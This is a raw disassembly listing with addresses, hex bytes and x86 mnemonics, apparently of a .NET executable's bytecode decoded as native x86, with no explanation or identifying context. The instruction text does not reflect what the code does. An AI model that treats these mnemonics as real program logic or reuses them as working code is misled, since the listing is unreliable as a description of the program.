  402b89:	5d                   	pop    %ebp
  402b8a:	00 00                	add    %al,(%eax)
  402b8c:	0a 1a                	or     (%edx),%bl
  402b8e:	da 6f 6b             	fisubrl 0x6b(%edi)
  402b91:	00 00                	add    %al,(%eax)
  402b93:	0a 72 66             	or     0x66(%edx),%dh
  402b96:	03 00                	add    (%eax),%eax
  402b98:	70 28                	jo     0x402bc2
  402b9a:	1e                   	push   %ds
  402b9b:	00 00                	add    %al,(%eax)
  402b9d:	0a 0c 2b             	or     (%ebx,%ebp,1),%cl
  402ba0:	39 07                	cmp    %eax,(%edi)
  402ba2:	20 00                	and    %al,(%eax)
  402ba4:	00 10                	add    %dl,(%eax)
  402ba6:	00 6a 31             	add    %ch,0x31(%edx)
  402ba9:	30 07                	xor    %al,(%edi)
  402bab:	6c                   	insb   (%dx),%es:(%edi)
  402bac:	23 00                	and    (%eax),%eax
  402bae:	00 00                	add    %al,(%eax)
  402bb0:	00 00                	add    %al,(%eax)
  402bb2:	00 30                	add    %dh,(%eax)
  402bb4:	41                   	inc    %ecx
  402bb5:	5b                   	pop    %ebx
  402bb6:	13 04 12             	adc    (%edx,%edx,1),%eax
  402bb9:	04 28                	add    $0x28,%al
  402bbb:	6a 00                	push   $0x0
  402bbd:	00 0a                	add    %cl,(%edx)
  402bbf:	0c 08                	or     $0x8,%al
  402bc1:	1a 08                	sbb    (%eax),%cl
  402bc3:	6f                   	outsl  %ds:(%esi),(%dx)
  402bc4:	5d                   	pop    %ebp
  402bc5:	00 00                	add    %al,(%eax)
  402bc7:	0a 1a                	or     (%edx),%bl
  402bc9:	da 6f 6b             	fisubrl 0x6b(%edi)
  402bcc:	00 00                	add    %al,(%eax)
  402bce:	0a 72 6e             	or     0x6e(%edx),%dh
  402bd1:	03 00                	add    (%eax),%eax
  402bd3:	70 28                	jo     0x402bfd
  402bd5:	1e                   	push   %ds
  402bd6:	00 00                	add    %al,(%eax)
  402bd8:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  402bdb:	0a de                	or     %dh,%bl
  402bdd:	1d de 1b 25 28       	sbb    $0x28251bde,%eax
  402be2:	23 00                	and    (%eax),%eax
  402be4:	00 0a                	add    %cl,(%edx)
  402be6:	0d 72 0e 02 00       	or     $0x20e72,%eax
  402beb:	70 0a                	jo     0x402bf7
  402bed:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402bf3:	07                   	pop    %es
  402bf4:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402bfa:	00 06                	add    %al,(%esi)
  402bfc:	2a 00                	sub    (%eax),%al
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	01 10                	add    %edx,(%eax)
  402c02:	00 00                	add    %al,(%eax)
  402c04:	00 00                	add    %al,(%eax)
  402c06:	00 00                	add    %al,(%eax)
  402c08:	9c                   	pushf
  402c09:	9c                   	pushf
  402c0a:	00 1b                	add    %bl,(%ebx)
  402c0c:	26 00 00             	add    %al,%es:(%eax)
  402c0f:	01 1b                	add    %ebx,(%ebx)
  402c11:	30 08                	xor    %cl,(%eax)
  402c13:	00 c5                	add    %al,%ch
  402c15:	01 00                	add    %eax,(%eax)
  402c17:	00 17                	add    %dl,(%edi)
  402c19:	00 00                	add    %al,(%eax)
  402c1b:	11 7e 10             	adc    %edi,0x10(%esi)
  402c1e:	00 00                	add    %al,(%eax)
  402c20:	04 2d                	add    $0x2d,%al
  402c22:	05 38 b8 01 00       	add    $0x1b838,%eax
  402c27:	00 7e 11             	add    %bh,0x11(%esi)
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	04 02                	add    $0x2,%al
  402c2e:	6f                   	outsl  %ds:(%esi),(%dx)
  402c2f:	6c                   	insb   (%dx),%es:(%edi)
  402c30:	00 00                	add    %al,(%eax)
  402c32:	0a 0a                	or     (%edx),%cl
  402c34:	06                   	push   %es
  402c35:	16                   	push   %ss
  402c36:	3e 56                	ds push %esi
  402c38:	01 00                	add    %eax,(%eax)
  402c3a:	00 7e 12             	add    %bh,0x12(%esi)
  402c3d:	00 00                	add    %al,(%eax)
  402c3f:	04 15                	add    $0x15,%al
  402c41:	6a 40                	push   $0x40
  402c43:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  402c44:	00 00                	add    %al,(%eax)
  402c46:	00 7e 13             	add    %bh,0x13(%esi)
  402c49:	00 00                	add    %al,(%eax)
  402c4b:	04 16                	add    $0x16,%al
  402c4d:	91                   	xchg   %eax,%ecx
  402c4e:	16                   	push   %ss
  402c4f:	40                   	inc    %eax
  402c50:	83 00 00             	addl   $0x0,(%eax)
  402c53:	00 7e 14             	add    %bh,0x14(%esi)
  402c56:	00 00                	add    %al,(%eax)
  402c58:	04 6f                	add    $0x6f,%al
  402c5a:	6d                   	insl   (%dx),%es:(%edi)
  402c5b:	00 00                	add    %al,(%eax)
  402c5d:	0a 28                	or     (%eax),%ch
  402c5f:	60                   	pusha
  402c60:	00 00                	add    %al,(%eax)
  402c62:	06                   	push   %es
  402c63:	28 6e 00             	sub    %ch,0x0(%esi)
  402c66:	00 0a                	add    %cl,(%edx)
  402c68:	80 12 00             	adcb   $0x0,(%edx)
  402c6b:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c6e:	14 00                	adc    $0x0,%al
  402c70:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402c73:	6f                   	outsl  %ds:(%esi),(%dx)
  402c74:	00 00                	add    %al,(%eax)
  402c76:	0a 73 37             	or     0x37(%ebx),%dh
  402c79:	00 00                	add    %al,(%eax)
  402c7b:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  402c81:	7e 12                	jle    0x402c95
  402c83:	00 00                	add    %al,(%eax)
  402c85:	04 16                	add    $0x16,%al
  402c87:	6a 33                	push   $0x33
  402c89:	36 15 6a 80 12 00    	ss adc $0x12806a,%eax
  402c8f:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c92:	11 00                	adc    %eax,(%eax)
  402c94:	00 04 7e             	add    %al,(%esi,%edi,2)
  402c97:	13 00                	adc    (%eax),%eax
  402c99:	00 04 16             	add    %al,(%esi,%edx,1)
  402c9c:	7e 13                	jle    0x402cb1
  402c9e:	00 00                	add    %al,(%eax)
  402ca0:	04 8e                	add    $0x8e,%al
  402ca2:	b7 16                	mov    $0x16,%bh
  402ca4:	14 fe                	adc    $0xfe,%al
  402ca6:	06                   	push   %es
  402ca7:	25 00 00 06 73       	and    $0x73060000,%eax
  402cac:	3c 00                	cmp    $0x0,%al
  402cae:	00 0a                	add    %cl,(%edx)
  402cb0:	7e 11                	jle    0x402cc3
  402cb2:	00 00                	add    %al,(%eax)
  402cb4:	04 6f                	add    $0x6f,%al
  402cb6:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402cbb:	dd 20                	frstor (%eax)
  402cbd:	01 00                	add    %eax,(%eax)
  402cbf:	00 7e 12             	add    %bh,0x12(%esi)
  402cc2:	00 00                	add    %al,(%eax)
  402cc4:	04 17                	add    $0x17,%al
  402cc6:	6a da                	push   $0xffffffda
  402cc8:	b7 17                	mov    $0x17,%bh
  402cca:	d6                   	salc
  402ccb:	8d 36                	lea    (%esi),%esi
  402ccd:	00 00                	add    %al,(%eax)
  402ccf:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  402cd5:	2b 11                	sub    (%ecx),%edx
  402cd7:	7e 14                	jle    0x402ced
  402cd9:	00 00                	add    %al,(%eax)
  402cdb:	04 7e                	add    $0x7e,%al
  402cdd:	13 00                	adc    (%eax),%eax
  402cdf:	00 04 16             	add    %al,(%esi,%edx,1)
  402ce2:	91                   	xchg   %eax,%ecx
  402ce3:	6f                   	outsl  %ds:(%esi),(%dx)
  402ce4:	70 00                	jo     0x402ce6
  402ce6:	00 0a                	add    %cl,(%edx)
  402ce8:	38 a2 00 00 00 7e    	cmp    %ah,0x7e000000(%edx)
  402cee:	14 00                	adc    $0x0,%al
  402cf0:	00 04 7e             	add    %al,(%esi,%edi,2)
  402cf3:	13 00                	adc    (%eax),%eax
  402cf5:	00 04 16             	add    %al,(%esi,%edx,1)
  402cf8:	06                   	push   %es
  402cf9:	6f                   	outsl  %ds:(%esi),(%dx)
  402cfa:	71 00                	jno    0x402cfc
  402cfc:	00 0a                	add    %cl,(%edx)
  402cfe:	7e 14                	jle    0x402d14
  402d00:	00 00                	add    %al,(%eax)
  402d02:	04 6f                	add    $0x6f,%al
  402d04:	72 00                	jb     0x402d06
  402d06:	00 0a                	add    %cl,(%edx)
  402d08:	7e 12                	jle    0x402d1c
  402d0a:	00 00                	add    %al,(%eax)
  402d0c:	04 33                	add    $0x33,%al
  402d0e:	60                   	pusha
  402d0f:	14 fe                	adc    $0xfe,%al
  402d11:	06                   	push   %es
  402d12:	2d 00 00 06 73       	sub    $0x73060000,%eax
  402d17:	73 00                	jae    0x402d19
  402d19:	00 0a                	add    %cl,(%edx)
  402d1b:	73 74                	jae    0x402d91
  402d1d:	00 00                	add    %al,(%eax)
  402d1f:	0a 0b                	or     (%ebx),%cl
  402d21:	07                   	pop    %es
  402d22:	14 72                	adc    $0x72,%al
  402d24:	76 03                	jbe    0x402d29
  402d26:	00 70 17             	add    %dh,0x17(%eax)
  402d29:	8d 03                	lea    (%ebx),%eax
  402d2b:	00 00                	add    %al,(%eax)
  402d2d:	01 0d 09 16 7e 14    	add    %ecx,0x147e1609
  402d33:	00 00                	add    %al,(%eax)
  402d35:	04 6f                	add    $0x6f,%al
  402d37:	6d                   	insl   (%dx),%es:(%edi)
  402d38:	00 00                	add    %al,(%eax)
  402d3a:	0a a2 09 14 14 14    	or     0x14141409(%edx),%ah
  402d40:	17                   	pop    %ss
  402d41:	28 75 00             	sub    %dh,0x0(%ebp)
  402d44:	00 0a                	add    %cl,(%edx)
  402d46:	26 15 6a 80 12 00    	es adc $0x12806a,%eax
  402d4c:	00 04 7e             	add    %al,(%esi,%edi,2)
  402d4f:	14 00                	adc    $0x0,%al
  402d51:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402d54:	6f                   	outsl  %ds:(%esi),(%dx)
  402d55:	00 00                	add    %al,(%eax)
  402d57:	0a 73 37             	or     0x37(%ebx),%dh
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	0a 80 14 00 00 04    	or     0x4000014(%eax),%al
  402d62:	17                   	pop    %ss
  402d63:	8d 36                	lea    (%esi),%esi
  402d65:	00 00                	add    %al,(%eax)
  402d67:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  402d6d:	2b 20                	sub    (%eax),%esp
  402d6f:	7e 12                	jle    0x402d83
  402d71:	00 00                	add    %al,(%eax)
  402d73:	04 7e                	add    $0x7e,%al
  402d75:	14 00                	adc    $0x0,%al
  402d77:	00 04 6f             	add    %al,(%edi,%ebp,2)
  402d7a:	72 00                	jb     0x402d7c
  402d7c:	00 0a                	add    %cl,(%edx)
  402d7e:	da 17                	ficoml (%edi)
  402d80:	6a da                	push   $0xffffffda
  402d82:	b7 17                	mov    $0x17,%bh
  402d84:	d6                   	salc
  402d85:	8d 36                	lea    (%esi),%esi
  402d87:	00 00                	add    %al,(%eax)
  402d89:	01 80 13 00 00 04    	add    %eax,0x4000013(%eax)
  402d8f:	2b 08                	sub    (%eax),%ecx
  402d91:	16                   	push   %ss
  402d92:	80 10 00             	adcb   $0x0,(%eax)
  402d95:	00 04 de             	add    %al,(%esi,%ebx,8)
  402d98:	47                   	inc    %edi
  402d99:	7e 11                	jle    0x402dac
  402d9b:	00 00                	add    %al,(%eax)
  402d9d:	04 7e                	add    $0x7e,%al
  402d9f:	13 00                	adc    (%eax),%eax
  402da1:	00 04 16             	add    %al,(%esi,%edx,1)
  402da4:	7e 13                	jle    0x402db9
  402da6:	00 00                	add    %al,(%eax)
  402da8:	04 8e                	add    $0x8e,%al
  402daa:	b7 16                	mov    $0x16,%bh
  402dac:	14 fe                	adc    $0xfe,%al
  402dae:	06                   	push   %es
  402daf:	25 00 00 06 73       	and    $0x73060000,%eax
  402db4:	3c 00                	cmp    $0x0,%al
  402db6:	00 0a                	add    %cl,(%edx)
  402db8:	7e 11                	jle    0x402dcb
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	04 6f                	add    $0x6f,%al
  402dbe:	3d 00 00 0a 26       	cmp    $0x260a0000,%eax
  402dc3:	de 1b                	ficomps (%ebx)
  402dc5:	25 28 23 00 00       	and    $0x2328,%eax
  402dca:	0a 0c 16             	or     (%esi,%edx,1),%cl
  402dcd:	80 10 00             	adcb   $0x0,(%eax)
  402dd0:	00 04 28             	add    %al,(%eax,%ebp,1)
  402dd3:	25 00 00 0a de       	and    $0xde0a0000,%eax
  402dd8:	07                   	pop    %es
  402dd9:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402ddf:	00 2a                	add    %ch,(%edx)
  402de1:	00 00                	add    %al,(%eax)
  402de3:	00 41 1c             	add    %al,0x1c(%ecx)
  402de6:	00 00                	add    %al,(%eax)
  402de8:	00 00                	add    %al,(%eax)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	0c 00                	or     $0x0,%al
  402dee:	00 00                	add    %al,(%eax)
  402df0:	9d                   	popf
  402df1:	01 00                	add    %eax,(%eax)
  402df3:	00 a9 01 00 00 1b    	add    %ch,0x1b000001(%ecx)
  402df9:	00 00                	add    %al,(%eax)
  402dfb:	00 26                	add    %ah,(%esi)
  402dfd:	00 00                	add    %al,(%eax)
  402dff:	01 1b                	add    %ebx,(%ebx)
  402e01:	30 02                	xor    %al,(%edx)
  402e03:	00 17                	add    %dl,(%edi)
  402e05:	00 00                	add    %al,(%eax)
  402e07:	00 18                	add    %bl,(%eax)
  402e09:	00 00                	add    %al,(%eax)
  402e0b:	11 02                	adc    %eax,(%edx)
  402e0d:	28 2f                	sub    %ch,(%edi)
  402e0f:	00 00                	add    %al,(%eax)
  402e11:	06                   	push   %es
  402e12:	de 0e                	fimuls (%esi)
  402e14:	25 28 23 00 00       	and    $0x2328,%eax
  402e19:	0a 0a                	or     (%edx),%cl
  402e1b:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402e21:	00 2a                	add    %ch,(%edx)
  402e23:	00 01                	add    %al,(%ecx)
  402e25:	10 00                	adc    %al,(%eax)
  402e27:	00 00                	add    %al,(%eax)
  402e29:	00 00                	add    %al,(%eax)
  402e2b:	00 08                	add    %cl,(%eax)
  402e2d:	08 00                	or     %al,(%eax)
  402e2f:	0e                   	push   %cs
  402e30:	26 00 00             	add    %al,%es:(%eax)
  402e33:	01 1b                	add    %ebx,(%ebx)
  402e35:	30 07                	xor    %al,(%edi)
  402e37:	00 c9                	add    %cl,%cl
  402e39:	00 00                	add    %al,(%eax)
  402e3b:	00 19                	add    %bl,(%ecx)
  402e3d:	00 00                	add    %al,(%eax)
  402e3f:	11 7e 17             	adc    %edi,0x17(%esi)
  402e42:	00 00                	add    %al,(%eax)
  402e44:	04 13                	add    $0x13,%al
  402e46:	04 11                	add    $0x11,%al
  402e48:	04 28                	add    $0x28,%al
  402e4a:	76 00                	jbe    0x402e4c
  402e4c:	00 0a                	add    %cl,(%edx)
  402e4e:	16                   	push   %ss
  402e4f:	13 05 11 04 12 05    	adc    0x5120411,%eax
  402e55:	28 77 00             	sub    %dh,0x0(%edi)
  402e58:	00 0a                	add    %cl,(%edx)
  402e5a:	7e 10                	jle    0x402e6c
  402e5c:	00 00                	add    %al,(%eax)
  402e5e:	04 39                	add    $0x39,%al
  402e60:	96                   	xchg   %eax,%esi
  402e61:	00 00                	add    %al,(%eax)
  402e63:	00 73 37             	add    %dh,0x37(%ebx)
  402e66:	00 00                	add    %al,(%eax)
  402e68:	0a 0a                	or     (%edx),%cl
  402e6a:	02 28                	add    (%eax),%ch
  402e6c:	5f                   	pop    %edi
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	06                   	push   %es
  402e70:	28 67 00             	sub    %ah,0x0(%edi)
  402e73:	00 06                	add    %al,(%esi)
  402e75:	0b 07                	or     (%edi),%eax
  402e77:	8e b7 28 78 00 00    	mov    0x7828(%edi),%?
  402e7d:	0a 72 82             	or     -0x7e(%edx),%dh
  402e80:	03 00                	add    (%eax),%eax
  402e82:	70 28                	jo     0x402eac
  402e84:	1e                   	push   %ds
  402e85:	00 00                	add    %al,(%eax)
  402e87:	0a 28                	or     (%eax),%ch
  402e89:	5f                   	pop    %edi
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	06                   	push   %es
  402e8d:	0c 06                	or     $0x6,%al
  402e8f:	08 16                	or     %dl,(%esi)
  402e91:	08 8e b7 6f 71 00    	or     %cl,0x716fb7(%esi)
  402e97:	00 0a                	add    %cl,(%edx)
  402e99:	06                   	push   %es
  402e9a:	07                   	pop    %es
  402e9b:	16                   	push   %ss
  402e9c:	07                   	pop    %es
  402e9d:	8e b7 6f 71 00 00    	mov    0x716f(%edi),%?
  402ea3:	0a 7e 11             	or     0x11(%esi),%bh
  402ea6:	00 00                	add    %al,(%eax)
  402ea8:	04 15                	add    $0x15,%al
  402eaa:	17                   	pop    %ss
  402eab:	6f                   	outsl  %ds:(%esi),(%dx)
  402eac:	79 00                	jns    0x402eae
  402eae:	00 0a                	add    %cl,(%edx)
  402eb0:	26 7e 11             	es jle 0x402ec4
  402eb3:	00 00                	add    %al,(%eax)
  402eb5:	04 06                	add    $0x6,%al
  402eb7:	6f                   	outsl  %ds:(%esi),(%dx)
  402eb8:	6d                   	insl   (%dx),%es:(%edi)
  402eb9:	00 00                	add    %al,(%eax)
  402ebb:	0a 16                	or     (%esi),%dl
  402ebd:	06                   	push   %es
  402ebe:	6f                   	outsl  %ds:(%esi),(%dx)
  402ebf:	72 00                	jb     0x402ec1
  402ec1:	00 0a                	add    %cl,(%edx)
  402ec3:	b7 16                	mov    $0x16,%bh
  402ec5:	14 fe                	adc    $0xfe,%al
  402ec7:	06                   	push   %es
  402ec8:	28 00                	sub    %al,(%eax)
  402eca:	00 06                	add    %al,(%esi)
  402ecc:	73 3c                	jae    0x402f0a
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	0a 14 6f             	or     (%edi,%ebp,2),%dl
  402ed3:	7a 00                	jp     0x402ed5
  402ed5:	00 0a                	add    %cl,(%edx)
  402ed7:	26 de 0a             	fimuls %es:(%edx)
  402eda:	06                   	push   %es
  402edb:	2c 06                	sub    $0x6,%al
  402edd:	06                   	push   %es
  402ede:	6f                   	outsl  %ds:(%esi),(%dx)
  402edf:	30 00                	xor    %al,(%eax)
  402ee1:	00 0a                	add    %cl,(%edx)
  402ee3:	dc de                	(bad)
  402ee5:	14 25                	adc    $0x25,%al
  402ee7:	28 23                	sub    %ah,(%ebx)
  402ee9:	00 00                	add    %al,(%eax)
  402eeb:	0a 0d 16 80 10 00    	or     0x108016,%cl
  402ef1:	00 04 28             	add    %al,(%eax,%ebp,1)
  402ef4:	25 00 00 0a de       	and    $0xde0a0000,%eax
  402ef9:	00 de                	add    %bl,%dh
  402efb:	0c 11                	or     $0x11,%al
  402efd:	05 2c 07 11 04       	add    $0x411072c,%eax
  402f02:	28 7b 00             	sub    %bh,0x0(%ebx)
  402f05:	00 0a                	add    %cl,(%edx)
  402f07:	dc 2a                	fsubrl (%edx)
  402f09:	00 00                	add    %al,(%eax)
  402f0b:	00 01                	add    %al,(%ecx)
  402f0d:	28 00                	sub    %al,(%eax)
  402f0f:	00 02                	add    %al,(%edx)
  402f11:	00 2a                	add    %ch,(%edx)
  402f13:	00 70 9a             	add    %dh,-0x66(%eax)
  402f16:	00 0a                	add    %cl,(%edx)
  402f18:	00 00                	add    %al,(%eax)
  402f1a:	00 00                	add    %al,(%eax)
  402f1c:	00 00                	add    %al,(%eax)
  402f1e:	24 00                	and    $0x0,%al
  402f20:	82 a6 00 14 26 00 00 	andb   $0x0,0x261400(%esi)
  402f27:	01 02                	add    %eax,(%edx)
  402f29:	00 11                	add    %dl,(%ecx)
  402f2b:	00 ab bc 00 0c 00    	add    %ch,0xc00bc(%ebx)
  402f31:	00 00                	add    %al,(%eax)
  402f33:	00 1b                	add    %bl,(%ebx)
  402f35:	30 02                	xor    %al,(%edx)
  402f37:	00 23                	add    %ah,(%ebx)
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	00 1a                	add    %bl,(%edx)
  402f3d:	00 00                	add    %al,(%eax)
  402f3f:	11 7e 11             	adc    %edi,0x11(%esi)
  402f42:	00 00                	add    %al,(%eax)
  402f44:	04 02                	add    $0x2,%al
  402f46:	6f                   	outsl  %ds:(%esi),(%dx)
  402f47:	7c 00                	jl     0x402f49
  402f49:	00 0a                	add    %cl,(%edx)
  402f4b:	26 de 14 25 28 23 00 	ficoms %es:0x2328(,%eiz,1)
  402f52:	00 
  402f53:	0a 0a                	or     (%edx),%cl
  402f55:	16                   	push   %ss
  402f56:	80 10 00             	adcb   $0x0,(%eax)
  402f59:	00 04 28             	add    %al,(%eax,%ebp,1)
  402f5c:	25 00 00 0a de       	and    $0xde0a0000,%eax
  402f61:	00 2a                	add    %ch,(%edx)
  402f63:	00 01                	add    %al,(%ecx)
  402f65:	10 00                	adc    %al,(%eax)
  402f67:	00 00                	add    %al,(%eax)
  402f69:	00 00                	add    %al,(%eax)
  402f6b:	00 0e                	add    %cl,(%esi)
  402f6d:	0e                   	push   %cs
  402f6e:	00 14 26             	add    %dl,(%esi,%eiz,1)
  402f71:	00 00                	add    %al,(%eax)
  402f73:	01 1b                	add    %ebx,(%ebx)
  402f75:	30 02                	xor    %al,(%edx)
  402f77:	00 b6 00 00 00 1b    	add    %dh,0x1b000000(%esi)
  402f7d:	00 00                	add    %al,(%eax)
  402f7f:	11 7e 15             	adc    %edi,0x15(%esi)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	04 2c                	add    $0x2c,%al
  402f86:	20 7e 15             	and    %bh,0x15(%esi)
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	04 6f                	add    $0x6f,%al
  402f8d:	7d 00                	jge    0x402f8f
  402f8f:	00 0a                	add    %cl,(%edx)
  402f91:	14 80                	adc    $0x80,%al
  402f93:	15 00 00 04 de       	adc    $0xde040000,%eax
  402f98:	0e                   	push   %cs
  402f99:	25 28 23 00 00       	and    $0x2328,%eax
  402f9e:	0a 0a                	or     (%edx),%cl
  402fa0:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402fa6:	00 7e 18             	add    %bh,0x18(%esi)
  402fa9:	00 00                	add    %al,(%eax)
  402fab:	04 2c                	add    $0x2c,%al
  402fad:	20 7e 18             	and    %bh,0x18(%esi)
  402fb0:	00 00                	add    %al,(%eax)
  402fb2:	04 6f                	add    $0x6f,%al
  402fb4:	7d 00                	jge    0x402fb6
  402fb6:	00 0a                	add    %cl,(%edx)
  402fb8:	14 80                	adc    $0x80,%al
  402fba:	18 00                	sbb    %al,(%eax)
  402fbc:	00 04 de             	add    %al,(%esi,%ebx,8)
  402fbf:	0e                   	push   %cs
  402fc0:	25 28 23 00 00       	and    $0x2328,%eax
  402fc5:	0a 0b                	or     (%ebx),%cl
  402fc7:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  402fcd:	00 7e 14             	add    %bh,0x14(%esi)
  402fd0:	00 00                	add    %al,(%eax)
  402fd2:	04 2c                	add    $0x2c,%al
  402fd4:	2a 7e 14             	sub    0x14(%esi),%bh
  402fd7:	00 00                	add    %al,(%eax)
  402fd9:	04 6f                	add    $0x6f,%al
  402fdb:	7e 00                	jle    0x402fdd
  402fdd:	00 0a                	add    %cl,(%edx)
  402fdf:	7e 14                	jle    0x402ff5
  402fe1:	00 00                	add    %al,(%eax)
  402fe3:	04 6f                	add    $0x6f,%al
  402fe5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fe6:	00 00                	add    %al,(%eax)
  402fe8:	0a 14 80             	or     (%eax,%eax,4),%dl
  402feb:	14 00                	adc    $0x0,%al
  402fed:	00 04 de             	add    %al,(%esi,%ebx,8)
  402ff0:	0e                   	push   %cs
  402ff1:	25 28 23 00 00       	and    $0x2328,%eax
  402ff6:	0a 0c 28             	or     (%eax,%ebp,1),%cl
  402ff9:	25 00 00 0a de       	and    $0xde0a0000,%eax
  402ffe:	00 7e 11             	add    %bh,0x11(%esi)
  403001:	00 00                	add    %al,(%eax)
  403003:	04 2c                	add    $0x2c,%al
  403005:	2a 7e 11             	sub    0x11(%esi),%bh
  403008:	00 00                	add    %al,(%eax)
  40300a:	04 6f                	add    $0x6f,%al
  40300c:	7f 00                	jg     0x40300e
  40300e:	00 0a                	add    %cl,(%edx)
  403010:	7e 11                	jle    0x403023
  403012:	00 00                	add    %al,(%eax)
  403014:	04 6f                	add    $0x6f,%al
  403016:	80 00 00             	addb   $0x0,(%eax)
  403019:	0a 14 80             	or     (%eax,%eax,4),%dl
  40301c:	11 00                	adc    %eax,(%eax)
  40301e:	00 04 de             	add    %al,(%esi,%ebx,8)
  403021:	0e                   	push   %cs
  403022:	25 28 23 00 00       	and    $0x2328,%eax
  403027:	0a 0d 28 25 00 00    	or     0x2528,%cl
  40302d:	0a de                	or     %dh,%bl
  40302f:	00 28                	add    %ch,(%eax)
  403031:	81 00 00 0a 2a 00    	addl   $0x2a0a00,(%eax)
  403037:	00 01                	add    %al,(%ecx)
  403039:	34 00                	xor    $0x0,%al
  40303b:	00 00                	add    %al,(%eax)
  40303d:	00 07                	add    %al,(%edi)
  40303f:	00 12                	add    %dl,(%edx)
  403041:	19 00                	sbb    %eax,(%eax)
  403043:	0e                   	push   %cs
  403044:	26 00 00             	add    %al,%es:(%eax)
  403047:	01 00                	add    %eax,(%eax)
  403049:	00 2e                	add    %ch,(%esi)
  40304b:	00 12                	add    %dl,(%edx)
  40304d:	40                   	inc    %eax
  40304e:	00 0e                	add    %cl,(%esi)
  403050:	26 00 00             	add    %al,%es:(%eax)
  403053:	01 00                	add    %eax,(%eax)
  403055:	00 55 00             	add    %dl,0x0(%ebp)
  403058:	1c 71                	sbb    $0x71,%al
  40305a:	00 0e                	add    %cl,(%esi)
  40305c:	26 00 00             	add    %al,%es:(%eax)
  40305f:	01 00                	add    %eax,(%eax)
  403061:	00 86 00 1c a2 00    	add    %al,0xa21c00(%esi)
  403067:	0e                   	push   %cs
  403068:	26 00 00             	add    %al,%es:(%eax)
  40306b:	01 1b                	add    %ebx,(%ebx)
  40306d:	30 02                	xor    %al,(%edx)
  40306f:	00 29                	add    %ch,(%ecx)
  403071:	00 00                	add    %al,(%eax)
  403073:	00 00                	add    %al,(%eax)
  403075:	00 00                	add    %al,(%eax)
  403077:	00 7e 1a             	add    %bh,0x1a(%esi)
  40307a:	00 00                	add    %al,(%eax)
  40307c:	04 2c                	add    $0x2c,%al
  40307e:	13 7e 10             	adc    0x10(%esi),%edi
  403081:	00 00                	add    %al,(%eax)
  403083:	04 2c                	add    $0x2c,%al
  403085:	0c 7e                	or     $0x7e,%al
  403087:	19 00                	sbb    %eax,(%eax)
  403089:	00 04 17             	add    %al,(%edi,%edx,1)
  40308c:	d6                   	salc
  40308d:	80 19 00             	sbbb   $0x0,(%ecx)
  403090:	00 04 de             	add    %al,(%esi,%ebx,8)
  403093:	0c 28                	or     $0x28,%al
  403095:	23 00                	and    (%eax),%eax
  403097:	00 0a                	add    %cl,(%edx)
  403099:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40309f:	00 2a                	add    %ch,(%edx)
  4030a1:	00 00                	add    %al,(%eax)
  4030a3:	00 01                	add    %al,(%ecx)
  4030a5:	10 00                	adc    %al,(%eax)
  4030a7:	00 00                	add    %al,(%eax)
  4030a9:	00 00                	add    %al,(%eax)
  4030ab:	00 1c 1c             	add    %bl,(%esp,%ebx,1)
  4030ae:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  4030b1:	00 00                	add    %al,(%eax)
  4030b3:	01 1b                	add    %ebx,(%ebx)
  4030b5:	30 03                	xor    %al,(%ebx)
  4030b7:	00 5d 00             	add    %bl,0x0(%ebp)
  4030ba:	00 00                	add    %al,(%eax)
  4030bc:	1c 00                	sbb    $0x0,%al
  4030be:	00 11                	add    %dl,(%ecx)
  4030c0:	7e 10                	jle    0x4030d2
  4030c2:	00 00                	add    %al,(%eax)
  4030c4:	04 2c                	add    $0x2c,%al
  4030c6:	45                   	inc    %ebp
  4030c7:	1b 8d 23 00 00 01    	sbb    0x1000023(%ebp),%ecx
  4030cd:	0b 07                	or     (%edi),%eax
  4030cf:	16                   	push   %ss
  4030d0:	72 86                	jb     0x403058
  4030d2:	03 00                	add    (%eax),%eax
  4030d4:	70 a2                	jo     0x403078
  4030d6:	07                   	pop    %es
  4030d7:	17                   	pop    %ss
  4030d8:	7e 0a                	jle    0x4030e4
  4030da:	00 00                	add    %al,(%eax)
  4030dc:	04 a2                	add    $0xa2,%al
  4030de:	07                   	pop    %es
  4030df:	18 28                	sbb    %ch,(%eax)
  4030e1:	5e                   	pop    %esi
  4030e2:	00 00                	add    %al,(%eax)
  4030e4:	06                   	push   %es
  4030e5:	a2 07 19 7e 0a       	mov    %al,0xa7e1907
  4030ea:	00 00                	add    %al,(%eax)
  4030ec:	04 a2                	add    $0xa2,%al
  4030ee:	07                   	pop    %es
  4030ef:	1a 7e 2e             	sbb    0x2e(%esi),%bh
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	04 a2                	add    $0xa2,%al
  4030f6:	07                   	pop    %es
  4030f7:	28 82 00 00 0a 28    	sub    %al,0x280a0000(%edx)
  4030fd:	27                   	daa
  4030fe:	00 00                	add    %al,(%eax)
  403100:	06                   	push   %es
  403101:	17                   	pop    %ss
  403102:	80 1a 00             	sbbb   $0x0,(%edx)
  403105:	00 04 28             	add    %al,(%eax,%ebp,1)
  403108:	81 00 00 0a de 0e    	addl   $0xede0a00,(%eax)
  40310e:	25 28 23 00 00       	and    $0x2328,%eax
